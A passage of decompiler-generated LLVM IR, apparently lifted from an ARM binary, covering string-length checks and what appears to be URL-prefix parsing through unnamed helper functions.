  %v1_9a54 = inttoptr i32 %v1_9a50 to i8*
  %v2_9a54 = call i32 @function_12c94(i8* %v1_9a54)
  store i32 %v2_9a54, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9a58 = icmp slt i32 %v2_9a54, 0
  store i1 %v1_9a58, i1* %cpsr_n.global-to-local, align 1
  %v2_9a58 = icmp eq i32 %v2_9a54, 0
  store i1 %v2_9a58, i1* %cpsr_z.global-to-local, align 1
  %tmp239 = icmp slt i32 %v2_9a54, 1
  br i1 %tmp239, label %dec_label_pc_9400, label %dec_label_pc_9a60

dec_label_pc_9a60:                                ; preds = %dec_label_pc_9a30
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9a64 = load i32, i32* %stack_var_-40, align 4
  %v0_9a68 = load i32, i32* @r5, align 4
  %v0_9a6c = load i32, i32* @r4, align 4
  store i32 %v0_9a6c, i32* @r0, align 4
  %v2_9a68 = add i32 %v3_9a64, 1
  %v1_9a70 = add i32 %v2_9a68, %v0_9a68
  store i32 %v1_9a70, i32* %r1.global-to-local, align 4
  %v2_9a74 = inttoptr i32 %v0_9a6c to i8*
  %v3_9a74 = call i32 @function_12cbc(i8* %v2_9a74, i32 %v1_9a70)
  store i32 %v3_9a74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9400

dec_label_pc_9a7c:                                ; preds = %dec_label_pc_8dd0
  %v0_9a7c = load i32, i32* @r8, align 4
  %v1_9a7c = add i32 %v0_9a7c, -1456
  %v2_9a7c = inttoptr i32 %v1_9a7c to i32*
  %v3_9a7c = load i32, i32* %v2_9a7c, align 4
  store i32 %v3_9a7c, i32* %r0.global-to-local, align 4
  %v1_9a80 = call i32 @function_13654(i32 %v3_9a7c)
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_9a8c = load i32, i32* @r8, align 4
  %v2_9a8c = add i32 %v1_9a8c, -1456
  %v3_9a8c = inttoptr i32 %v2_9a8c to i32*
  store i32 -1, i32* %v3_9a8c, align 4
  %v0_9a90 = load i32, i32* %r3.global-to-local, align 4
  %v1_9a90 = trunc i32 %v0_9a90 to i8
  %v2_9a90 = load i32, i32* @r8, align 4
  %v3_9a90 = add i32 %v2_9a90, -1452
  %v4_9a90 = inttoptr i32 %v3_9a90 to i8*
  store i8 %v1_9a90, i8* %v4_9a90, align 1
  br label %dec_label_pc_8838

dec_label_pc_9a98:                                ; preds = %dec_label_pc_9650
  %v0_9a98 = load i32, i32* @r8, align 4
  %v1_9a98 = add i32 %v0_9a98, -1452
  %v2_9a98 = inttoptr i32 %v1_9a98 to i8*
  %v3_9a98 = load i8, i8* %v2_9a98, align 1
  %v4_9a98 = zext i8 %v3_9a98 to i32
  store i32 %v4_9a98, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_9a9c = icmp eq i8 %v3_9a98, 0
  store i1 %v2_9a9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a9c, label %dec_label_pc_8838, label %dec_label_pc_9400

dec_label_pc_9aa8:                                ; preds = %dec_label_pc_98c0
  %v0_9aa8 = load i32, i32* @r4, align 4
  store i32 %v0_9aa8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_15f1c.21 to i32), i32* %r1.global-to-local, align 4
  %v3_9ab0 = inttoptr i32 %v0_9aa8 to i8*
  %v4_9ab0 = call i32 @function_13074(i8* %v3_9ab0, i32 ptrtoint ([4 x i8]* @global_var_15f1c.21 to i32))
  store i32 %v4_9ab0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9ab4 = icmp slt i32 %v4_9ab0, 0
  store i1 %v1_9ab4, i1* %cpsr_n.global-to-local, align 1
  %v2_9ab4 = icmp eq i32 %v4_9ab0, 0
  store i1 %v2_9ab4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9ab4, label %bb240, label %dec_label_pc_98f4

bb240:                                            ; preds = %dec_label_pc_9aa8
  %v0_9abc = load i32, i32* %fp.global-to-local, align 4
  %v1_9abc = load i32, i32* @r5, align 4
  %v2_9abc = sub i32 %v0_9abc, %v1_9abc
  %v3_9abc = icmp uge i32 %v0_9abc, %v1_9abc
  store i1 %v3_9abc, i1* %cpsr_c.global-to-local, align 1
  %v4_9abc = xor i32 %v1_9abc, %v0_9abc
  %v5_9abc = xor i32 %v2_9abc, %v0_9abc
  %v6_9abc = and i32 %v5_9abc, %v4_9abc
  %v7_9abc = icmp slt i32 %v6_9abc, 0
  store i1 %v7_9abc, i1* %cpsr_v.global-to-local, align 1
  %v8_9abc = icmp slt i32 %v2_9abc, 0
  store i1 %v8_9abc, i1* %cpsr_n.global-to-local, align 1
  %v9_9abc = icmp eq i32 %v0_9abc, %v1_9abc
  store i1 %v9_9abc, i1* %cpsr_z.global-to-local, align 1
  %v7_9ac0 = icmp sgt i32 %v0_9abc, %v1_9abc
  %. = select i1 %v7_9ac0, i32 10, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v9_9ac8 = trunc i32 %. to i8
  %v10_9ac8 = load i32, i32* @r8, align 4
  %v11_9ac8 = add i32 %v10_9ac8, -1452
  %v12_9ac8 = inttoptr i32 %v11_9ac8 to i8*
  store i8 %v9_9ac8, i8* %v12_9ac8, align 1
  br label %dec_label_pc_98fc

dec_label_pc_9ad4:                                ; preds = %dec_label_pc_9548
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v0_9adc = load i32, i32* @r8, align 4
  %v1_9adc = add i32 %v0_9adc, 656
  %v2_9adc = inttoptr i32 %v1_9adc to i32*
  %v3_9adc = load i32, i32* %v2_9adc, align 4
  store i32 %v3_9adc, i32* @r4, align 4
  %v3_9ae0 = call i32 @function_12288(i32 36, i32* null)
  %v0_9ae4 = load i32, i32* @r4, align 4
  store i32 %v0_9ae4, i32* %r1.global-to-local, align 4
  store i32 %v3_9ae0, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_9af0 = load i32, i32* @r7, align 4
  store i32 %v0_9af0, i32* %r0.global-to-local, align 4
  %v4_9af4 = call i32 @function_12d58(i32 %v0_9af0, i32 %v0_9ae4, i32 %v3_9ae0, i32 11)
  store i32 %v4_9af4, i32* %r0.global-to-local, align 4
  %v0_9af8 = load i32, i32* @r8, align 4
  %v1_9af8 = add i32 %v0_9af8, 656
  %v2_9af8 = inttoptr i32 %v1_9af8 to i32*
  %v3_9af8 = load i32, i32* %v2_9af8, align 4
  %v0_9afc = load i32, i32* @r7, align 4
  %v2_9afc = add i32 %v0_9afc, %v4_9af4
  store i32 %v2_9afc, i32* @r5, align 4
  store i32 %v4_9af4, i32* @r4, align 4
  %v2_9b04 = sub i32 %v3_9af8, %v4_9af4
  store i32 %v2_9b04, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f58.51 to i32), i32* %r2.global-to-local, align 4
  %v0_9b0c = load i32, i32* @sl, align 4
  store i32 %v0_9b0c, i32* %r3.global-to-local, align 4
  store i32 %v2_9afc, i32* %r0.global-to-local, align 4
  %v4_9b14 = call i32 @function_12d58(i32 %v2_9afc, i32 %v2_9b04, i32 ptrtoint (i32* @global_var_15f58.51 to i32), i32 %v0_9b0c)
  store i32 %v4_9b14, i32* %r0.global-to-local, align 4
  %v0_9b18 = load i32, i32* @r8, align 4
  %v1_9b18 = add i32 %v0_9b18, 12
  %v2_9b18 = inttoptr i32 %v1_9b18 to i32*
  %v3_9b18 = load i32, i32* %v2_9b18, align 4
  store i32 %v3_9b18, i32* %r3.global-to-local, align 4
  %v0_9b1c = load i32, i32* @r4, align 4
  %v2_9b1c = add i32 %v0_9b1c, %v4_9b14
  store i32 %v2_9b1c, i32* %r6.global-to-local, align 4
  %v1_9b20 = load i32, i32* %sb.global-to-local, align 4
  %v2_9b20 = add i32 %v1_9b20, %v2_9b1c
  store i32 %v2_9b20, i32* %r2.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v1_9b28 = add i32 %v3_9b18, -4
  %v2_9b28 = icmp ugt i32 %v3_9b18, 3
  store i1 %v2_9b28, i1* %cpsr_c.global-to-local, align 1
  %v3_9b28 = sub i32 3, %v3_9b18
  %v4_9b28 = and i32 %v3_9b28, %v3_9b18
  %v5_9b28 = icmp slt i32 %v4_9b28, 0
  store i1 %v5_9b28, i1* %cpsr_v.global-to-local, align 1
  %v6_9b28 = icmp slt i32 %v1_9b28, 0
  store i1 %v6_9b28, i1* %cpsr_n.global-to-local, align 1
  %v7_9b28 = icmp eq i32 %v3_9b18, 4
  store i1 %v7_9b28, i1* %cpsr_z.global-to-local, align 1
  %v3_9b2c = add i32 %v2_9b20, 2115
  %v4_9b2c = inttoptr i32 %v3_9b2c to i8*
  store i8 0, i8* %v4_9b2c, align 1
  %v7_9b30 = icmp sgt i32 %v3_9b18, 4
  br i1 %v7_9b30, label %dec_label_pc_9b34, label %dec_label_pc_9bbc

dec_label_pc_9b34:                                ; preds = %dec_label_pc_9ad4, %dec_label_pc_9bbc, %dec_label_pc_9bcc
  store i32 -1, i32* %r6.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_9b3c = load i32, i32* @r8, align 4
  %v2_9b3c = add i32 %v1_9b3c, 8
  %v3_9b3c = inttoptr i32 %v2_9b3c to i32*
  store i32 -1, i32* %v3_9b3c, align 4
  %v0_9b40 = load i32, i32* %r3.global-to-local, align 4
  %v1_9b40 = trunc i32 %v0_9b40 to i8
  %v2_9b40 = load i32, i32* @r8, align 4
  %v3_9b40 = add i32 %v2_9b40, -1452
  %v4_9b40 = inttoptr i32 %v3_9b40 to i8*
  store i8 %v1_9b40, i8* %v4_9b40, align 1
  br label %dec_label_pc_8838

dec_label_pc_9b48:                                ; preds = %dec_label_pc_99c0, %bb236
  %v2_9b4c = phi i32 [ %v1_99b0, %bb236 ], [ %v2_99d4, %dec_label_pc_99c0 ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_9b4c = inttoptr i32 %v2_9b4c to i8*
  store i8 0, i8* %v3_9b4c, align 1
  br label %dec_label_pc_99e8

dec_label_pc_9b54:                                ; preds = %dec_label_pc_93f0
  %v0_9b54 = load i32, i32* %sb.global-to-local, align 4
  %v1_9b58 = add i32 %v0_9b54, 533
  store i32 %v1_9b58, i32* @r4, align 4
  store i32 %v1_9b58, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9b64 = call i32 @function_12d34(i32 %v1_9b58, i32 255)
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  %v3_9b6c = load i32, i32* %stack_var_-40, align 4
  %v0_9b70 = load i32, i32* @r5, align 4
  %v2_9b70 = add i32 %v3_9b6c, 1
  %v1_9b74 = add i32 %v2_9b70, %v0_9b70
  store i32 %v1_9b74, i32* %r0.global-to-local, align 4
  %v1_9b78 = inttoptr i32 %v1_9b74 to i8*
  %v2_9b78 = call i32 @function_12c94(i8* %v1_9b78)
  store i32 %v2_9b78, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9b7c = icmp slt i32 %v2_9b78, 0
  store i1 %v1_9b7c, i1* %cpsr_n.global-to-local, align 1
  %v2_9b7c = icmp eq i32 %v2_9b78, 0
  store i1 %v2_9b7c, i1* %cpsr_z.global-to-local, align 1
  %tmp241 = icmp slt i32 %v2_9b78, 1
  br i1 %tmp241, label %dec_label_pc_9400, label %dec_label_pc_9b84

dec_label_pc_9b84:                                ; preds = %dec_label_pc_9b54
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9b88 = load i32, i32* %stack_var_-40, align 4
  %v0_9b8c = load i32, i32* @r5, align 4
  %v2_9b8c = add i32 %v3_9b88, 1
  %v1_9b90 = add i32 %v2_9b8c, %v0_9b8c
  store i32 %v1_9b90, i32* %r0.global-to-local, align 4
  %v1_9b94 = inttoptr i32 %v1_9b90 to i8*
  %v2_9b94 = call i32 @function_12c94(i8* %v1_9b94)
  store i32 %v2_9b94, i32* %r0.global-to-local, align 4
  %v1_9b98 = add i32 %v2_9b94, -255
  %v2_9b98 = icmp ugt i32 %v2_9b94, 254
  store i1 %v2_9b98, i1* %cpsr_c.global-to-local, align 1
  %v3_9b98 = sub i32 254, %v2_9b94
  %v4_9b98 = and i32 %v3_9b98, %v2_9b94
  %v5_9b98 = icmp slt i32 %v4_9b98, 0
  store i1 %v5_9b98, i1* %cpsr_v.global-to-local, align 1
  %v6_9b98 = icmp slt i32 %v1_9b98, 0
  store i1 %v6_9b98, i1* %cpsr_n.global-to-local, align 1
  %v7_9b98 = icmp eq i32 %v2_9b94, 255
  store i1 %v7_9b98, i1* %cpsr_z.global-to-local, align 1
  %v8_9b9c = icmp sgt i32 %v2_9b94, 255
  br i1 %v8_9b9c, label %dec_label_pc_9400, label %dec_label_pc_9ba0

dec_label_pc_9ba0:                                ; preds = %dec_label_pc_9b84
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9ba4 = load i32, i32* %stack_var_-40, align 4
  %v0_9ba8 = load i32, i32* @r5, align 4
  %v0_9bac = load i32, i32* @r4, align 4
  store i32 %v0_9bac, i32* @r0, align 4
  %v2_9ba8 = add i32 %v3_9ba4, 1
  %v1_9bb0 = add i32 %v2_9ba8, %v0_9ba8
  store i32 %v1_9bb0, i32* %r1.global-to-local, align 4
  %v2_9bb4 = inttoptr i32 %v0_9bac to i8*
  %v3_9bb4 = call i32 @function_12cbc(i8* %v2_9bb4, i32 %v1_9bb0)
  store i32 %v3_9bb4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9400

dec_label_pc_9bbc:                                ; preds = %dec_label_pc_9ad4
  %v0_9bbc = load i32, i32* @r5, align 4
  store i32 %v0_9bbc, i32* %r0.global-to-local, align 4
  %v1_9bc0 = inttoptr i32 %v0_9bbc to i8*
  %v2_9bc0 = call i32 @function_12c94(i8* %v1_9bc0)
  store i32 %v2_9bc0, i32* %r0.global-to-local, align 4
  %v1_9bc4 = add i32 %v2_9bc0, -127
  %v2_9bc4 = icmp ugt i32 %v2_9bc0, 126
  store i1 %v2_9bc4, i1* %cpsr_c.global-to-local, align 1
  %v3_9bc4 = sub i32 126, %v2_9bc0
  %v4_9bc4 = and i32 %v3_9bc4, %v2_9bc0
  %v5_9bc4 = icmp slt i32 %v4_9bc4, 0
  store i1 %v5_9bc4, i1* %cpsr_v.global-to-local, align 1
  %v6_9bc4 = icmp slt i32 %v1_9bc4, 0
  store i1 %v6_9bc4, i1* %cpsr_n.global-to-local, align 1
  %v7_9bc4 = icmp eq i32 %v2_9bc0, 127
  store i1 %v7_9bc4, i1* %cpsr_z.global-to-local, align 1
  %v8_9bc8 = icmp sgt i32 %v2_9bc0, 127
  br i1 %v8_9bc8, label %dec_label_pc_9b34, label %dec_label_pc_9bcc

dec_label_pc_9bcc:                                ; preds = %dec_label_pc_9bbc
  %v0_9bcc = load i32, i32* @r8, align 4
  %v1_9bcc = add i32 %v0_9bcc, 12
  %v2_9bcc = inttoptr i32 %v1_9bcc to i32*
  %v3_9bcc = load i32, i32* %v2_9bcc, align 4
  store i32 %v1_9410, i32* %r2.global-to-local, align 4
  %v1_9bd4 = and i32 %v3_9bcc, 33554432
  %v2_9bd4 = icmp ne i32 %v1_9bd4, 0
  store i1 %v2_9bd4, i1* %cpsr_c.global-to-local, align 1
  %v3_9bd4 = mul i32 %v3_9bcc, 128
  %v0_9bd8 = load i32, i32* @r5, align 4
  store i32 %v0_9bd8, i32* %r1.global-to-local, align 4
  %v2_9bdc = add i32 %v3_9bd4, %v1_9410
  store i32 %v2_9bdc, i32* @r0, align 4
  %v2_9be0 = inttoptr i32 %v2_9bdc to i8*
  %v3_9be0 = call i32 @function_12cbc(i8* %v2_9be0, i32 %v0_9bd8)
  store i32 %v3_9be0, i32* %r0.global-to-local, align 4
  %v0_9be4 = load i32, i32* @r8, align 4
  %v1_9be4 = add i32 %v0_9be4, 12
  %v2_9be4 = inttoptr i32 %v1_9be4 to i32*
  %v3_9be4 = load i32, i32* %v2_9be4, align 4
  store i32 %v1_9410, i32* %r3.global-to-local, align 4
  %v1_9bec = and i32 %v3_9be4, 33554432
  %v2_9bec = icmp ne i32 %v1_9bec, 0
  store i1 %v2_9bec, i1* %cpsr_c.global-to-local, align 1
  %v3_9bec = mul i32 %v3_9be4, 128
  %v2_9bf0 = add i32 %v3_9bec, %v1_9410
  store i32 %v2_9bf0, i32* %r4.global-to-local, align 4
  store i32 %v2_9bf0, i32* %r0.global-to-local, align 4
  %v1_9bf8 = inttoptr i32 %v2_9bf0 to i8*
  %v2_9bf8 = call i32 @function_12c94(i8* %v1_9bf8)
  store i32 ptrtoint (i32* @global_var_15f5c.53 to i32), i32* %r1.global-to-local, align 4
  %v2_9c00 = add i32 %v2_9bf0, %v2_9bf8
  store i32 %v2_9c00, i32* @r0, align 4
  %v2_9c04 = inttoptr i32 %v2_9c00 to i8*
  %v3_9c04 = call i32 @function_12cbc(i8* %v2_9c04, i32 ptrtoint (i32* @global_var_15f5c.53 to i32))
  store i32 %v3_9c04, i32* %r0.global-to-local, align 4
  %v0_9c08 = load i32, i32* %r6.global-to-local, align 4
  %v1_9c08 = add i32 %v0_9c08, 3
  store i32 %v1_9c08, i32* @r4, align 4
  %v0_9c0c = load i32, i32* @r8, align 4
  %v1_9c0c = add i32 %v0_9c0c, 656
  %v2_9c0c = inttoptr i32 %v1_9c0c to i32*
  %v3_9c0c = load i32, i32* %v2_9c0c, align 4
  %v0_9c10 = load i32, i32* @r7, align 4
  %v2_9c10 = add i32 %v0_9c10, %v1_9c08
  store i32 %v2_9c10, i32* %r6.global-to-local, align 4
  %v2_9c14 = sub i32 %v3_9c0c, %v1_9c08
  store i32 %v2_9c14, i32* %r1.global-to-local, align 4
  %v0_9c18 = load i32, i32* @sl, align 4
  store i32 %v0_9c18, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f58.51 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9c10, i32* %r0.global-to-local, align 4
  %v4_9c24 = call i32 @function_12d58(i32 %v2_9c10, i32 %v2_9c14, i32 ptrtoint (i32* @global_var_15f58.51 to i32), i32 %v0_9c18)
  store i32 %v4_9c24, i32* %r0.global-to-local, align 4
  %v0_9c28 = load i32, i32* @r8, align 4
  %v1_9c28 = add i32 %v0_9c28, 12
  %v2_9c28 = inttoptr i32 %v1_9c28 to i32*
  %v3_9c28 = load i32, i32* %v2_9c28, align 4
  store i32 %v1_9410, i32* %ip.global-to-local, align 4
  %v1_9c30 = and i32 %v3_9c28, 33554432
  %v2_9c30 = icmp ne i32 %v1_9c30, 0
  store i1 %v2_9c30, i1* %cpsr_c.global-to-local, align 1
  %v3_9c30 = mul i32 %v3_9c28, 128
  %v0_9c34 = load i32, i32* @r4, align 4
  %v1_9c34 = load i32, i32* %sb.global-to-local, align 4
  %v2_9c38 = add i32 %v3_9c30, %v1_9410
  store i32 %v2_9c38, i32* @r5, align 4
  %v2_9c34 = add i32 %v0_9c34, %v4_9c24
  %v2_9c3c = add i32 %v2_9c34, %v1_9c34
  store i32 %v2_9c3c, i32* @r4, align 4
  %v0_9c40 = load i32, i32* %fp.global-to-local, align 4
  %v1_9c40 = trunc i32 %v0_9c40 to i8
  %v3_9c40 = add i32 %v2_9c3c, 2115
  %v4_9c40 = inttoptr i32 %v3_9c40 to i8*
  store i8 %v1_9c40, i8* %v4_9c40, align 1
  %v0_9c44 = load i32, i32* @r5, align 4
  store i32 %v0_9c44, i32* %r0.global-to-local, align 4
  %v1_9c48 = inttoptr i32 %v0_9c44 to i8*
  %v2_9c48 = call i32 @function_12c94(i8* %v1_9c48)
  %v0_9c4c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_9c4c, i32* %r1.global-to-local, align 4
  %v0_9c50 = load i32, i32* @r5, align 4
  %v2_9c50 = add i32 %v0_9c50, %v2_9c48
  store i32 %v2_9c50, i32* @r0, align 4
  %v2_9c54 = inttoptr i32 %v2_9c50 to i8*
  %v3_9c54 = call i32 @function_12cbc(i8* %v2_9c54, i32 %v0_9c4c)
  store i32 %v3_9c54, i32* %r0.global-to-local, align 4
  %v0_9c58 = load i32, i32* @r8, align 4
  %v1_9c58 = add i32 %v0_9c58, 12
  %v2_9c58 = inttoptr i32 %v1_9c58 to i32*
  %v3_9c58 = load i32, i32* %v2_9c58, align 4
  %v1_9c5c = add i32 %v3_9c58, 1
  store i32 %v1_9c5c, i32* %r3.global-to-local, align 4
  store i32 %v1_9c5c, i32* %v2_9c58, align 4
  br label %dec_label_pc_9b34

dec_label_pc_9c68:                                ; preds = %dec_label_pc_984c
  store i32 7, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %stack_var_-40, align 4
  %v0_9c74 = load i32, i32* @r5, align 4
  %v1_9c74 = add i32 %v0_9c74, 4
  %v2_9c74 = inttoptr i32 %v1_9c74 to i8*
  %v3_9c74 = load i8, i8* %v2_9c74, align 1
  %v4_9c74 = zext i8 %v3_9c74 to i32
  store i32 %v4_9c74, i32* %r3.global-to-local, align 4
  %v2_9c78 = icmp ugt i8 %v3_9c74, 114
  store i1 %v2_9c78, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9c78 = icmp ult i8 %v3_9c74, 115
  store i1 %v6_9c78, i1* %cpsr_n.global-to-local, align 1
  %v7_9c78 = icmp eq i8 %v3_9c74, 115
  store i1 %v7_9c78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9c78, label %bb242, label %.thread69

bb242:                                            ; preds = %dec_label_pc_9c68
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 8, i32* %stack_var_-40, align 4
  br label %.thread69

.thread69:                                        ; preds = %dec_label_pc_9c68, %bb242
  %v3_9c88 = phi i32 [ 7, %dec_label_pc_9c68 ], [ 8, %bb242 ]
  %v0_9c8c = load i32, i32* @r7, align 4
  %v1_9c8c = sub nsw i32 1, %v3_9c88
  %v2_9c90 = add i32 %v1_9c8c, %v0_9c8c
  store i32 %v2_9c90, i32* @r2, align 4
  store i32 %v0_9c74, i32* @r0, align 4
  %v2_9c98 = add i32 %v3_9c88, %v0_9c74
  store i32 %v2_9c98, i32* @r1, align 4
  %v3_9c9c = call i32 @function_13c80(i32 %v0_9c74, i32 %v2_9c98, i32 %v2_9c90)
  store i32 %v3_9c9c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v0_9cac = load i32, i32* @r6, align 4
  %v1_9cac = load i32, i32* @r4, align 4
  %v2_9cac = add i32 %v1_9cac, %v0_9cac
  %v3_9cac = inttoptr i32 %v2_9cac to i8*
  %v4_9cac = load i8, i8* %v3_9cac, align 1
  %v6_9cac = zext i8 %v4_9cac to i32
  store i32 %v6_9cac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v9_9cb0 = icmp eq i8 %v4_9cac, 0
  store i1 %v9_9cb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9cb0, label %dec_label_pc_9cf0, label %dec_label_pc_9cb8

dec_label_pc_9cb8:                                ; preds = %.thread69
  %v2_9cb8 = icmp ugt i8 %v4_9cac, 46
  store i1 %v2_9cb8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9cb8 = icmp ult i8 %v4_9cac, 47
  store i1 %v6_9cb8, i1* %cpsr_n.global-to-local, align 1
  %v7_9cb8 = icmp eq i8 %v4_9cac, 47
  store i1 %v7_9cb8, i1* %cpsr_z.global-to-local, align 1
  %v1_9cbc = load i32, i32* @r5, align 4
  br i1 %v7_9cb8, label %bb243, label %dec_label_pc_9cc4

bb243:                                            ; preds = %dec_label_pc_9cb8
  store i32 %v1_9cbc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9dd4

dec_label_pc_9cc4:                                ; preds = %dec_label_pc_9cb8
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9cd4

dec_label_pc_9ccc:                                ; preds = %dec_label_pc_9cd4
  %v2_9ccc = icmp ugt i8 %v4_9cdc, 46
  store i1 %v2_9ccc, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9ccc = icmp ult i8 %v4_9cdc, 47
  store i1 %v6_9ccc, i1* %cpsr_n.global-to-local, align 1
  %v7_9ccc = icmp eq i8 %v4_9cdc, 47
  store i1 %v7_9ccc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9ccc, label %dec_label_pc_9dd4, label %dec_label_pc_9cd4

dec_label_pc_9cd4:                                ; preds = %dec_label_pc_9ccc, %dec_label_pc_9cc4
  %v1_9ce4 = phi i32 [ %v1_9ce8, %dec_label_pc_9ccc ], [ 1, %dec_label_pc_9cc4 ]
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 %v1_9ce4, i32* %stack_var_-40, align 4
  %v2_9cdc = add i32 %v1_9ce4, %v1_9cbc
  %v3_9cdc = inttoptr i32 %v2_9cdc to i8*
  %v4_9cdc = load i8, i8* %v3_9cdc, align 1
  %v6_9cdc = zext i8 %v4_9cdc to i32
  store i32 %v6_9cdc, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_9ce0 = icmp eq i8 %v4_9cdc, 0
  store i1 %v2_9ce0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_9cdc, i32* %r1.global-to-local, align 4
  %v1_9ce8 = add i32 %v1_9ce4, 1
  store i32 %v1_9ce8, i32* %r3.global-to-local, align 4
  br i1 %v2_9ce0, label %dec_label_pc_9cf0, label %dec_label_pc_9ccc

dec_label_pc_9cf0:                                ; preds = %dec_label_pc_9cd4, %.thread69, %dec_label_pc_9dd4
  %v0_9cf0 = load i32, i32* @r5, align 4
  store i32 %v0_9cf0, i32* %r0.global-to-local, align 4
  %v1_9cf4 = inttoptr i32 %v0_9cf0 to i8*
  %v2_9cf4 = call i32 @function_12c94(i8* %v1_9cf4)
  store i32 %v2_9cf4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9cf8 = icmp slt i32 %v2_9cf4, 0
  store i1 %v1_9cf8, i1* %cpsr_n.global-to-local, align 1
  %v2_9cf8 = icmp eq i32 %v2_9cf4, 0
  store i1 %v2_9cf8, i1* %cpsr_z.global-to-local, align 1
  %tmp244 = icmp slt i32 %v2_9cf4, 1
  br i1 %tmp244, label %dec_label_pc_9d1c, label %dec_label_pc_9d00

dec_label_pc_9d00:                                ; preds = %dec_label_pc_9cf0
  %v0_9d00 = load i32, i32* @r5, align 4
  store i32 %v0_9d00, i32* %r0.global-to-local, align 4
  %v1_9d04 = inttoptr i32 %v0_9d00 to i8*
  %v2_9d04 = call i32 @function_12c94(i8* %v1_9d04)
  store i32 %v2_9d04, i32* %r0.global-to-local, align 4
  %v1_9d08 = add i32 %v2_9d04, -127
  %v2_9d08 = icmp ugt i32 %v2_9d04, 126
  store i1 %v2_9d08, i1* %cpsr_c.global-to-local, align 1
  %v3_9d08 = sub i32 126, %v2_9d04
  %v4_9d08 = and i32 %v3_9d08, %v2_9d04
  %v5_9d08 = icmp slt i32 %v4_9d08, 0
  store i1 %v5_9d08, i1* %cpsr_v.global-to-local, align 1
  %v6_9d08 = icmp slt i32 %v1_9d08, 0
  store i1 %v6_9d08, i1* %cpsr_n.global-to-local, align 1
  %v7_9d08 = icmp eq i32 %v2_9d04, 127
  store i1 %v7_9d08, i1* %cpsr_z.global-to-local, align 1
  %v7_9d0c = icmp sgt i32 %v2_9d04, 127
  br i1 %v7_9d0c, label %.thread72, label %bb245

bb245:                                            ; preds = %dec_label_pc_9d00
  %v8_9d0c = load i32, i32* %sb.global-to-local, align 4
  %v9_9d10 = add i32 %v8_9d0c, 789
  store i32 %v9_9d10, i32* %r0.global-to-local, align 4
  %v8_9d14 = load i32, i32* @r5, align 4
  store i32 %v8_9d14, i32* %r1.global-to-local, align 4
  br label %.thread72

.thread72:                                        ; preds = %dec_label_pc_9d00, %bb245
  store i32 40220, i32* @lr, align 4
  %v3_9d18 = xor i1 %v6_9d08, %v5_9d08
  %v4_9d18 = or i1 %v7_9d08, %v3_9d18
  call void @__pseudo_cond_branch(i1 %v4_9d18, i32 ptrtoint (i32* @global_var_12cbc.49 to i32))
  br label %dec_label_pc_9d1c

dec_label_pc_9d1c:                                ; preds = %dec_label_pc_9cf0, %.thread72
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9d20 = load i32, i32* %stack_var_-40, align 4
  %v0_9d24 = load i32, i32* @r5, align 4
  %v2_9d24 = add i32 %v3_9d20, 1
  %v1_9d28 = add i32 %v2_9d24, %v0_9d24
  store i32 %v1_9d28, i32* %r0.global-to-local, align 4
